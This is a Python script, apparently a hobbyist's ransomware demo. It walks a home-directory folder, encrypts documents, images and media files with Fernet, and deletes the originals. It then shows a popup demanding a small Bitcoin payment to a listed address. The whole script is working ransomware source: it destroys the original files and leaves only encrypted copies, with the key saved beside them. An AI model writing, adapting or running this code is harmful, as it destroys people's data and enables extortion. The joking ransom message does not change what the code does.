import os
from cryptography.fernet import Fernet
import tkinter as tk
from tkinter import messagebox
import sys
import time

# Generate Encryption Key
key = Fernet.generate_key()

# String Key in a file
with open('filekey.key', 'wb') as filekey:
    filekey.write(key)

# Function to Encrypt Files
def encrypt_file(file_path, key):
    fernet = Fernet(key)
    with open(file_path, 'rb') as file:
        file_data = file.read()
        encrypted_data = fernet.encrypt(file_data)
    with open(file_path + '.encrypted', 'wb') as encrypted_file:
        encrypted_file.write(encrypted_data)

# Popup Message ("You got hit by ransomware!") or something
def show_popup(message):
    root = tk.Tk()
    root.withdraw()  # Hide the main window

    messagebox.showinfo("Important Message", message)

    root.mainloop()

# Directory to encrypt files from (replace with your Ubuntu directory path)
directory_path = "/home/maxwell/Desktop/Happy Files/"

# List of allowed file extensions to encrypt
allowed_extensions = ['.txt', '.pdf', '.docx', '.jpg', '.png', '.mp3', '.mp4']

# List of blacklisted system-related file extensions
blacklisted_extensions = ['.dll', '.exe', '.sys', '.ini']

for root, dirs, files in os.walk(directory_path):
    for file in files:
        file_path = os.path.join(root, file)
        file_extension = os.path.splitext(file_path)[1]

        if file_extension.lower() in allowed_extensions and file_extension.lower() not in blacklisted_extensions:
            encrypt_file(file_path, key)
            print(f"File '{file_path}' would be encrypted.")
            time.sleep(1)
            os.remove(file_path)
            print(f"Original file '{file_path}' has been deleted.")

# Ransomware Popup
message_text = "You just got hit by Ransomware! Pay $5 in Bitcoin to this Address (I need to buy Coffee): bc1qf0ynzyjsl3zs63jn7xr5hjrdkad9xpexyafxuj"
show_popup(message_text)

sys.exit()
